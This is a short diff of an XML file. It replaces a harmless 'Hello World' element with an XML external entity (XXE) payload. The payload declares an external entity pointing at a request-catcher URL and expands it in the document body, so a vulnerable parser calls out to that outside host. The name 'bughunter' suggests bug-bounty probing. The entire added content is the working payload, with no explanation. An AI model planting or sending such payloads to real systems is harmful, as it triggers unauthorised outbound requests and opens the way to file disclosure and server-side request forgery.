@@ -1,2 +1,6 @@
 <?xml version="1.0"?>
-<bughunter>Hello World</bughunter>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY>
+  <!ENTITY ext SYSTEM "https://root.requestcatcher.com/">
+]>
+<foo>&ext;</foo>
